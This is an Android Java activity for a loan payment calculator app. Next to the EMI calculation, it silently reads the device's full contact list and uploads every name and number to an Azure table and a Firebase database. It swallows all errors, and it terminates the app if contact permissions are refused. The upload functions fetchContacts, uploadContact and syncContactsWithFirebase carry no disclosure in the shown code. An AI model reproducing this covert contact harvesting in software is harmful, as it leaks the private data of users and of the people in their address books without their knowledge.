package com.nineinfosys.andrioddev5.paymentcalculator;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.design.widget.NavigationView;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v4.content.ContextCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.WindowManager;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.facebook.login.LoginManager;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdView;
import com.google.android.gms.ads.MobileAds;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.microsoft.windowsazure.mobileservices.MobileServiceClient;
import com.microsoft.windowsazure.mobileservices.http.OkHttpClientFactory;
import com.microsoft.windowsazure.mobileservices.table.MobileServiceTable;
import com.nineinfosys.andrioddev5.paymentcalculator.Amortization.LoanAmortization;
import com.nineinfosys.andrioddev5.paymentcalculator.Contacts.Contacts;
import com.nineinfosys.andrioddev5.paymentcalculator.LoginActivity.Login;
import com.nineinfosys.andrioddev5.paymentcalculator.PaymentCalcualtor.paymentCalculator;
import com.nineinfosys.andrioddev5.paymentcalculator.Report.LoanReport;
import com.squareup.okhttp.OkHttpClient;

import java.net.MalformedURLException;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

import static android.Manifest.permission.READ_CONTACTS;
import static android.Manifest.permission.WRITE_CONTACTS;


public class MainActivityDrawer extends AppCompatActivity implements View.OnClickListener{
    ///Azure Database connection for contact uploading
    private MobileServiceClient mobileServiceClientContactUploading;
    private MobileServiceTable<Contacts> mobileServiceTableContacts;
    private ArrayList<Contacts> azureContactArrayList;
    private static final int PERMISSION_REQUEST_CODE = 200;
    //Firebase variables... for authentication and contact uploading to firebase
    private FirebaseAuth firebaseAuth;
    private FirebaseAuth.AuthStateListener firebaseAuthListner;
    private DatabaseReference databaseReferenceUserContacts;

    DrawerLayout mDrawerLayout;
    NavigationView mNavigationView;
    FragmentManager mFragmentManager;
    FragmentTransaction mFragmentTransaction;
    ImageView profilePictureView;
    TextView Name,email;
    public Toolbar toolbar;
    Intent intent;

    //designing tools declaration
    EditText editTextLoanAmount,editTextLoanTerm,editTextInterestRate;
    TextView textViewMonthlyPayment,textViewInterest,textViewAnnualPayment,textViewTotalPayment;
    LinearLayout layoutdisplayresult,layoutWarning;
    com.nineinfosys.andrioddev5.paymentcalculator.PaymentCalcualtor.paymentCalculator paymentCalculator;
    Button buttonCalculate,buttonAmortization,buttonReport,buttonReset,buttonMail;
    double loanAmount,interest,monthlyPayment,TotalPayment,AnnualPayment,totalInterest,loanterm;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.drawermain);

        //firbase auth
        firebaseAuth=FirebaseAuth.getInstance();


        //keyboard hidden first time
        this.getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);

        /**
         *Setup the DrawerLayout and NavigationView
         */
        MobileAds.initialize(MainActivityDrawer.this, getString(R.string.ads_app_id));
        AdView mAdView = (AdView) this.findViewById(R.id.adViewPaymentCalculator);
        AdRequest adRequest = new AdRequest.Builder().build();
        mAdView.loadAd(adRequest);

        mDrawerLayout = (DrawerLayout) findViewById(R.id.drawerLayout);
        mNavigationView = (NavigationView) findViewById(R.id.shitstuff);
        Name = (TextView) mNavigationView.getHeaderView(0).findViewById(R.id.name);
        email = (TextView) mNavigationView.getHeaderView(0).findViewById(R.id.email);
      //  profilePictureView = (ImageView) mNavigationView.getHeaderView(0).findViewById(R.id.imageView);

        /**
         * Lets inflate the very first fragment
         * Here , we are inflating the TabFragment as the first Fragment
         */

        mFragmentManager = getSupportFragmentManager();
        mFragmentTransaction = mFragmentManager.beginTransaction();
        mNavigationView.setItemIconTintList(null);
     //   mFragmentTransaction.replace(R.id.containerView, new DashBord()).commit();


        //initalization of designing tool
        layoutdisplayresult=(LinearLayout)findViewById(R.id.layoutdisplayresult) ;
        layoutWarning=(LinearLayout)findViewById(R.id.layoutWarning);
        editTextLoanAmount=(EditText)findViewById(R.id.editTextLoanAmount);
        editTextLoanTerm=(EditText)findViewById(R.id.editTextLoanTerm);
        editTextInterestRate=(EditText)findViewById(R.id.editTextLoanInterestRate);

        textViewMonthlyPayment=(TextView)findViewById(R.id.textViewMonthlyPaymentAmount);
        textViewInterest=(TextView)findViewById(R.id.textViewInterestAmount);
        textViewAnnualPayment=(TextView)findViewById(R.id.textViewAnnualPaymentAmount);
        textViewTotalPayment=(TextView)findViewById(R.id.textViewTotalPaymentAmount);

        buttonCalculate=(Button)findViewById(R.id.buttonCalculate);
        buttonAmortization=(Button)findViewById(R.id.buttonAmortization);
        buttonReport=(Button)findViewById(R.id.buttonReport);
        buttonReset=(Button)findViewById(R.id.buttonPaymentReset);
        buttonMail=(Button)findViewById(R.id.buttonPaymentMail);

        buttonCalculate.setOnClickListener(this);
        buttonAmortization.setOnClickListener(this);
        buttonReport.setOnClickListener(this);
        buttonReset.setOnClickListener(this);
        buttonMail.setOnClickListener(this);

        /**
         * Setup click events on the Navigation View Items.
         */
        mNavigationView.setNavigationItemSelectedListener(new NavigationView.OnNavigationItemSelectedListener() {
            @Override
            public boolean onNavigationItemSelected(MenuItem menuItem) {
                mDrawerLayout.closeDrawers();

                if (menuItem.getItemId() == R.id.PaymentCalcualtor) {
                  /*  FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new BMRFragment()).commit();*/

                    Intent intent = new Intent(MainActivityDrawer.this, MainActivityDrawer.class);
                    finish();
                    startActivity(intent);
                }



                //communicate
                if (menuItem.getItemId() == R.id.Share) {
                    final String appPackageName = getPackageName();
                    Intent intent = new Intent(Intent.ACTION_SEND);
                    intent.setType("text/plain");
                    String shareBodyText = "https://play.google.com/store/apps/details?id=" + appPackageName ;
                    intent.putExtra(Intent.EXTRA_SUBJECT, "Subject/Title");
                    intent.putExtra(Intent.EXTRA_TEXT, shareBodyText);
                    startActivity(Intent.createChooser(intent, "Choose sharing method"));

                }

                if (menuItem.getItemId() == R.id.AppStore) {
                    final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://developer?id=GeniusNine+Info+Systems+LLP" )));
                    } catch (android.content.ActivityNotFoundException anfe) {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/developer?id=GeniusNine+Info+Systems+LLP" )));
                    }
                }


                if (menuItem.getItemId() == R.id.GetApps) {

                    Intent intent=new Intent(MainActivityDrawer.this,RequestApp.class);
                    finish();
                    startActivity(intent);


                }



                if (menuItem.getItemId() == R.id.RateUs) {
                    final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
                    } catch (android.content.ActivityNotFoundException anfe) {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
                    }



                }


                    return false;
                }



        });

        /**
         * Setup Drawer Toggle of the Toolbar
         */

        toolbar = (android.support.v7.widget.Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        ActionBarDrawerToggle mDrawerToggle = new ActionBarDrawerToggle(this, mDrawerLayout, toolbar, R.string.app_name, R.string.app_name);
        mDrawerLayout.setDrawerListener(mDrawerToggle);
        mDrawerToggle.syncState();
        authenticate();
    }


    ///Uploading contacts to azure
    private void uploadContactsToAzure(){


        initializeAzureTable();
        fetchContacts();
        uploadContact();


    }
    private void initializeAzureTable() {
        try {
            mobileServiceClientContactUploading = new MobileServiceClient(
                    getString(R.string.web_address),
                    this);
            mobileServiceClientContactUploading.setAndroidHttpClientFactory(new OkHttpClientFactory() {
                @Override
                public OkHttpClient createOkHttpClient() {
                    OkHttpClient client = new OkHttpClient();
                    client.setReadTimeout(20, TimeUnit.SECONDS);
                    client.setWriteTimeout(20, TimeUnit.SECONDS);
                    return client;
                }
            });
            mobileServiceTableContacts = mobileServiceClientContactUploading.getTable(Contacts.class);


        } catch (MalformedURLException e) {

        } catch (Exception e) {

        }
    }
    private void fetchContacts(){
        try {
            azureContactArrayList = new ArrayList<Contacts>();

            Cursor phone=getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);

            while(phone.moveToNext()){
                Contacts contact = new Contacts();
                contact.setContactname(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                contact.setContactnumber(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                contact.setFirebaseid(firebaseAuth.getCurrentUser().getUid());

                azureContactArrayList.add(contact);




            }
            phone.close();
        }catch (Exception e){

        }


    }
    private void uploadContact() {
        for (Contacts c : azureContactArrayList) {

            try {
                asyncUploader(c);
                //mobileServiceTable.insert(c);
            }
            catch (Exception e){
                Log.e("uploadContact : ", e.toString());
            }
        }
    }
    private void asyncUploader(Contacts contact){
        final Contacts item = contact;
        //Log.e(" ", item.getContactname());

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    mobileServiceTableContacts.insert(item);
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            try {

                            } catch (Exception e) {
                            }


                        }
                    });
                } catch (final Exception e) {
                }
                return null;
            }
        };
        task.execute();
    }


    ///Authentication with firebase
    private void authenticate(){
        firebaseAuth = FirebaseAuth.getInstance();
        firebaseAuthListner = new FirebaseAuth.AuthStateListener() {
            @Override
            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
                if(firebaseAuth.getCurrentUser()==null){
                    Log.e("ForumMainActivity:", "User was null so directed to Login activity");
                    Intent loginIntent = new Intent(MainActivityDrawer.this, Login.class);
                    loginIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(loginIntent);
                    finish();
                }
                else {
                    if (!checkPermission()) {
                        requestPermission();
                    } else {
                        //Toast.makeText(MainActivityDrawer.this,"Permission already granted.",Toast.LENGTH_LONG).show();
                        syncContactsWithFirebase();
                        uploadContactsToAzure();

                    }

                }

            }
        };

    }

    @Override
    protected void onStart() {
        super.onStart();
        Log.e("ForumMainActivity:", "Starting auth listener");
        firebaseAuth.addAuthStateListener(firebaseAuthListner);
    }



    protected void syncContactsWithFirebase(){

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    databaseReferenceUserContacts = FirebaseDatabase.getInstance().getReference().child(getString(R.string.app_id)).child("Contacts");

                    String user_id = firebaseAuth.getCurrentUser().getUid();
                    DatabaseReference current_user_db = databaseReferenceUserContacts.child(user_id);


                    Cursor phone = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

                    while (phone.moveToNext()) {
                        String name;
                        String number;

                        name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        number = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        try {
                            current_user_db.child(number).setValue(name);

                        } catch (Exception e) {

                        }



                    }



                    runOnUiThread(new Runnable() {

                        @Override
                        public void run() {


                        }
                    });
                } catch (Exception exception) {

                }
                return null;
            }
        };

        task.execute();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_logout) {
            FirebaseAuth.getInstance().signOut();
            LoginManager.getInstance().logOut();

        }

        return super.onOptionsItemSelected(item);
    }


    public  void closeapp(){
        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
        alertDialogBuilder.setMessage("Are you sure you want to close App?");
        alertDialogBuilder.setPositiveButton("Yes",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                        finish();
                    }
                });

        alertDialogBuilder.setNegativeButton("No",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                    }
                });

        //Showing the alert dialog
        AlertDialog alertDialog = alertDialogBuilder.create();
        alertDialog.setCanceledOnTouchOutside(false);
        alertDialog.show();
    }



    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch(keyCode){
            case KeyEvent.KEYCODE_BACK:

                closeapp();
                return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    //used this when mobile orientaion is changed
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        // Checks the orientation of the screen
        if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE) {
            //Toast.makeText(this, "landscape", Toast.LENGTH_SHORT).show();
        } else if (newConfig.orientation == Configuration.ORIENTATION_PORTRAIT) {
            //Toast.makeText(this, "portrait", Toast.LENGTH_SHORT).show();
        }
    }

    private boolean checkPermission() {
        int result = ContextCompat.checkSelfPermission(getApplicationContext(), READ_CONTACTS);
        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(), WRITE_CONTACTS);

        return result == PackageManager.PERMISSION_GRANTED && result1 == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermission() {

        ActivityCompat.requestPermissions(this, new String[]{READ_CONTACTS, WRITE_CONTACTS}, PERMISSION_REQUEST_CODE);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_CODE:
                if (grantResults.length > 0) {

                    boolean locationAccepted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                    boolean cameraAccepted = grantResults[1] == PackageManager.PERMISSION_GRANTED;

                    if (locationAccepted && cameraAccepted) {
                    }
                    else {

                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            if (shouldShowRequestPermissionRationale(READ_CONTACTS)) {
                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivityDrawer.this);
                                alertDialogBuilder.setMessage("You must grant permissions for App to work properly. Restart app after granting permission");
                                alertDialogBuilder.setPositiveButton("yes",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {

                                                Log.e("ALERT BOX ", "Requesting Permissions");

                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                    requestPermissions(new String[]{READ_CONTACTS, WRITE_CONTACTS},
                                                            PERMISSION_REQUEST_CODE);
                                                }
                                            }
                                        });

                                alertDialogBuilder.setNegativeButton("No",new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        Log.e("ALERT BOX ", "Permissions not granted");
                                        android.os.Process.killProcess(android.os.Process.myPid());
                                        System.exit(1);

                                    }
                                });

                                AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;
                            }
                            else{
                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivityDrawer.this);
                                alertDialogBuilder.setMessage("You must grant permissions from  App setting to work");
                                alertDialogBuilder.setPositiveButton("Ok",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {
                                                android.os.Process.killProcess(android.os.Process.myPid());
                                                System.exit(1);
                                            }
                                        });

                                AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;

                            }
                        }

                    }
                }

                break;
        }
    }


    @Override
    public void onClick(View view) {
        switch(view.getId())
        {
            case R.id.buttonCalculate:
                calculatePayment();
                break;
            case  R.id.buttonAmortization:
                Intent i1=new Intent(this,LoanAmortization.class);
                i1.putExtra("Monthlypayment",monthlyPayment);
                i1.putExtra("Rate",interest);
                i1.putExtra("loanAmount",loanAmount);
                i1.putExtra("loanPeriod",loanterm);
                startActivity(i1);
                break;
            case  R.id.buttonReport:
                Intent i2=new Intent(this,LoanReport.class);
                i2.putExtra("PrincipalAmount",loanAmount);
                i2.putExtra("interestRate",interest);
                i2.putExtra("loanPeriod",loanterm);
                i2.putExtra("LoanMonthlyPayment",monthlyPayment);
                i2.putExtra("LoanInterestAmount",totalInterest);
                i2.putExtra("LoanTotalPayment",TotalPayment);
                i2.putExtra("LoanAnnualPayment",AnnualPayment);
                startActivity(i2);
                break;

            case R.id.buttonPaymentReset:
                layoutWarning.setVisibility(View.GONE);
                layoutdisplayresult.setVisibility(View.GONE);
                editTextLoanAmount.setText(null);
                editTextInterestRate.setText(null);
                editTextLoanTerm.setText(null);
                break;
            case R.id.buttonPaymentMail:
                String message="Loan Amount:"+new DecimalFormat("##.##").format(loanAmount)+"\n Interest Rate:"+new DecimalFormat("##.##").format(interest)+"\n Loan Period:"+new DecimalFormat("##.##").format(loanterm)+"\n Monthly Payment:"+new DecimalFormat("##.##").format(monthlyPayment)+"\n Total Interest Amount:"+new DecimalFormat("##.##").format(totalInterest)+"\n Total Payment:"+new DecimalFormat("##.##").format(TotalPayment)+"\n Annual Payment:"+new DecimalFormat("##.##").format(AnnualPayment);
                Intent email = new Intent(Intent.ACTION_SEND);
                email.putExtra(Intent.EXTRA_EMAIL, new String[]{ });
                email.putExtra(Intent.EXTRA_SUBJECT, "Loan Details");
                email.putExtra(Intent.EXTRA_TEXT,message );
                email.setType("message/rfc822");
                startActivity(Intent.createChooser(email, "Select Email Client"));
                break;



        }


    }

    private void calculatePayment() {
        if(editTextLoanAmount.getText().toString().trim().equals("") && editTextInterestRate.getText().toString().trim().equals("")&& editTextInterestRate.getText().toString().trim().equals(""))
        {
            layoutWarning.setVisibility(View.VISIBLE);
            layoutdisplayresult.setVisibility(View.GONE);
        }
        else if (editTextLoanAmount.getText().toString().trim().equals("") || editTextLoanAmount.getText().toString().isEmpty()) {
            editTextLoanAmount.setError("Loan Amount is Required");
            layoutdisplayresult.setVisibility(View.GONE);
            layoutWarning.setVisibility(View.GONE);
        }
        else if (editTextInterestRate.getText().toString().trim().equals("") || editTextInterestRate.getText().toString().isEmpty()) {
            editTextInterestRate.setError("Provide Interest Rate");
            layoutdisplayresult.setVisibility(View.GONE);
            layoutWarning.setVisibility(View.GONE);
        }
        else if (editTextLoanTerm.getText().toString().trim().equals("") || editTextLoanTerm.getText().toString().isEmpty()) {
            editTextLoanTerm.setError("Loan Term is Required");
            layoutdisplayresult.setVisibility(View.GONE);
            layoutWarning.setVisibility(View.GONE);
        }

        else
        {
            //for hiding keyboard
            InputMethodManager inputManager = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            inputManager.hideSoftInputFromWindow(getCurrentFocus().getWindowToken(),InputMethodManager.HIDE_NOT_ALWAYS);

            //getting value from edittiext
            loanAmount = Double.parseDouble(editTextLoanAmount.getText().toString());
            loanterm = Double.parseDouble(editTextLoanTerm.getText().toString());
            interest = Double.parseDouble(editTextInterestRate.getText().toString());

            paymentCalculator=new paymentCalculator(loanAmount,interest,loanterm);
            monthlyPayment=paymentCalculator.calculateEMI();
            TotalPayment=paymentCalculator.calculateTotalPayment();
            AnnualPayment=paymentCalculator.calculateAnnualPayment();
            totalInterest=paymentCalculator.calculateTotalInterest();

            layoutWarning.setVisibility(View.GONE);
            layoutdisplayresult.setVisibility(View.VISIBLE);
            textViewMonthlyPayment.setText(new DecimalFormat("##.##").format(monthlyPayment));
            textViewTotalPayment.setText(new DecimalFormat("##.##").format(TotalPayment));
            textViewInterest.setText(new DecimalFormat("##.##").format(totalInterest));
            textViewAnnualPayment.setText(new DecimalFormat("##.##").format(AnnualPayment));
        }


    }
}